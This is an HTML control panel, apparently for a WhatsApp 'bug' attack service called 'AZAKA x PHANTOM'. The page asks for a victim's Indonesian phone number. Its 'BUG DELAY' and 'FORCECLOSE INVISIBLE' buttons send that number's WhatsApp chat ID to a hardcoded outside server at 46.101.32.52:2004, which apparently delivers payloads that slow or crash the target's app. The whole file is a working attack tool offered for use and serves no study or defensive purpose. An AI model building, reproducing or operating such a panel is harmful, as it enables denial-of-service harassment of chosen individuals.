<!-- index.html -->
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AZAKA x PHANTOM</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@900&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: url('bg.jpg') no-repeat center center fixed;
      background-size: cover;
      color: white;
      text-align: center;
    }
    .container {
      backdrop-filter: blur(4px);
      background-color: rgba(0, 0, 0, 0.6);
      padding: 2em;
      min-height: 100vh;
    }
    h1 {
      color: #ff0000;
      margin-bottom: 1em;
    }
    input {
      padding: 0.8em;
      width: 80%;
      max-width: 300px;
      border-radius: 10px;
      border: none;
      margin-bottom: 1em;
    }
    .button {
      display: block;
      margin: 1em auto;
      padding: 0.7em 2em;
      background-color: #d60032;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }
    .status {
      margin-top: 1em;
      font-weight: bold;
    }
    .logo {
      border-radius: 1em;
      box-shadow: 0 0 20px red;
      width: 150px;
    }
    .logout-btn {
  position: fixed; /* Ganti absolute → fixed */
  top: 10px;
  left: 10px;
  z-index: 9999; /* Lebih tinggi agar tidak tertutup */
  background-color: red;
  color: white;
  padding: 5px 12px;
  font-size: 13px;
  border: none;
  border-radius: 6px;
  cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logout">
      <button onclick="logout()" class="button" style="background-color:#444;">Logout</button>
    </div>
    <img src="logo.jpg" alt="Logo" class="logo" />
    <h1>AZAKA x PHANTOM</h1>
    <input id="target" placeholder="Masukkan nomor target (62xxxx)" />
    <button class="button" onclick="sendBugDelay()">BUG DELAY</button>
    <button class="button" onclick="sendForceClose()">FORCECLOSE INVISIBLE</button>
    <p class="status" id="status">Memuat status...</p>
  </div>

  <script>
    if (!localStorage.getItem('login')) {
      window.location.href = 'login.html';
    }

    async function loadStatus() {
      try {
        const res = await fetch('https://46.101.32.52:2004/status');
        const status = await res.text();
        document.getElementById('status').innerHTML = `Status: <span style="color: ${status === 'true' ? 'lime' : 'red'}">${status === 'true' ? 'ON' : 'OFF'}</span>`;
      } catch (e) {
        document.getElementById('status').innerHTML = '⚠️ Gagal memuat status';
      }
    }

    function sendBugDelay() {
      const target = document.getElementById('target').value;
      if (!target) return alert('Masukkan nomor terlebih dahulu');
      fetch(`https://46.101.32.52:2004/evolution?type=delay&chatId=${target}@s.whatsapp.net`);
    }

    function sendForceClose() {
      const target = document.getElementById('target').value;
      if (!target) return alert('Masukkan nomor terlebih dahulu');
      fetch(`https://46.101.32.52:2004/evolution?type=fcin&chatId=${target}@s.whatsapp.net`);
    }

    function logout() {
      localStorage.removeItem('login');
      window.location.href = 'login.html';
    }

    loadStatus();
  </script>
</body>
</html>
